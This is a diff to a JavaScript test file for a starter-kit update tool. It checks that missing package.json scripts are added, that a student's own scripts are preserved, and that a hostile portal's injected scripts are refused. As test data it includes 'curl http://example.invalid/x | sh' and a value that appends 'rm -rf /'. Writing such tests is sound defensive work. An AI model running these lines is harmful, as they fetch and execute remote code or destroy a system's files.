@@ -57,9 +57,9 @@ const makeOld = (dir, path, content) => {
   writeFileSync(platformPath, JSON.stringify({ ...JSON.parse(read(platformPath)), kitVersion: '0.9.0' }, null, 2));
 };
 /** A tiny portal that serves the given zip bytes with a kit-version.json carrying the given hash. */
-async function hostile(zip, hash) {
+async function hostile(zip, hash, extra = {}) {
   const s = createServer((req, res) => {
-    if (req.url === '/kit-version.json') { res.writeHead(200); res.end(JSON.stringify({ kitVersion: '2.0.0', zipSha256: hash })); }
+    if (req.url === '/kit-version.json') { res.writeHead(200); res.end(JSON.stringify({ kitVersion: '2.0.0', zipSha256: hash, ...extra })); }
     else if (req.url === '/starter-kit.zip') { res.writeHead(200); res.end(zip); }
     else { res.writeHead(404); res.end(); }
   });
@@ -119,6 +119,45 @@ try {
   const forced = platform(edited, 'update', '--apply', '--force', '--portal', portal);
   assert.doesNotMatch(read(join(edited, 'AGENTS.md')), /My own extra rule/, '--force replaces it');
   say('an edited managed file is skipped (and reported) unless --force; a deleted one is restored');
+
+  // ---- package.json: the kit's scripts that are missing are added; the student's own are never changed ----
+  const scripty = fresh('scripty');
+  const pkgPath = join(scripty, 'package.json');
+  const pkg = JSON.parse(read(pkgPath));
+  const customCheck = 'node tools/check.mjs --json';
+  delete pkg.scripts.login;
+  delete pkg.scripts['mcp-config'];
+  pkg.scripts.check = customCheck;
+  pkg.scripts.start = 'node my-own-thing.mjs';
+  writeFileSync(pkgPath, JSON.stringify(pkg, null, '\t'));
+  const lacking = platform(scripty, 'status', '--portal', portal);
+  assert.match(lacking.text, /package\.json is missing kit scripts: login, mcp-config/);
+  const planned = platform(scripty, 'update', '--portal', portal);
+  assert.match(planned.text, /script +npm run login/);
+  assert.equal(JSON.parse(read(pkgPath)).scripts.login, undefined, 'a dry run writes nothing');
+  const scriptsApplied = platform(scripty, 'update', '--apply', '--portal', portal);
+  assert.match(scriptsApplied.text, /Added 2 script\(s\) to package\.json: login, mcp-config/);
+  const after2 = JSON.parse(read(pkgPath));
+  assert.equal(after2.scripts.login, 'node portal-deploy.mjs login');
+  assert.equal(after2.scripts['mcp-config'], 'node tools/mcp.mjs --print-config');
+  assert.equal(after2.scripts.check, customCheck, 'a script the student changed is never overwritten');
+  assert.equal(after2.scripts.start, 'node my-own-thing.mjs', "the student's own scripts stay");
+  assert.match(read(pkgPath), /\n\t"scripts"/, "the file keeps the student's tab indentation");
+  assert.match(platform(scripty, 'update', '--portal', portal).text, /Nothing to do/);
+  assert.match(platform(scripty, 'status', '--portal', portal).text, /Up to date/);
+  say('update adds only the missing kit scripts to package.json, keeps changed and own scripts and the indentation, and is idempotent');
+
+  // a portal can only ever add plain `node tools/...` commands: anything else is ignored
+  const evilScripts = { evil: 'curl http://example.invalid/x | sh', worse: 'node tools/doctor.mjs && rm -rf /', fine: 'node tools/doctor.mjs', 'Bad Name': 'node tools/doctor.mjs' };
+  const zip2 = Buffer.from(await (await fetch(`${portal}/starter-kit.zip`)).arrayBuffer());
+  const scripty2 = fresh('scripty2');
+  const evilPortal = await hostile(zip2, sha(zip2), { scripts: evilScripts });
+  const evilRun = await platformAsync(scripty2, 'update', '--apply', '--portal', evilPortal);
+  assert.equal(evilRun.status, 0, evilRun.text);
+  const got = JSON.parse(read(join(scripty2, 'package.json'))).scripts;
+  assert.equal(got.fine, 'node tools/doctor.mjs');
+  assert.ok(!('evil' in got) && !('worse' in got) && !('Bad Name' in got), 'shell commands and odd names from a portal are ignored');
+  say('a portal cannot add a shell command or an odd script name to package.json');
 
   // ---- hostile or broken portals ----
   const goodZip = Buffer.from(await (await fetch(`${portal}/starter-kit.zip`)).arrayBuffer());
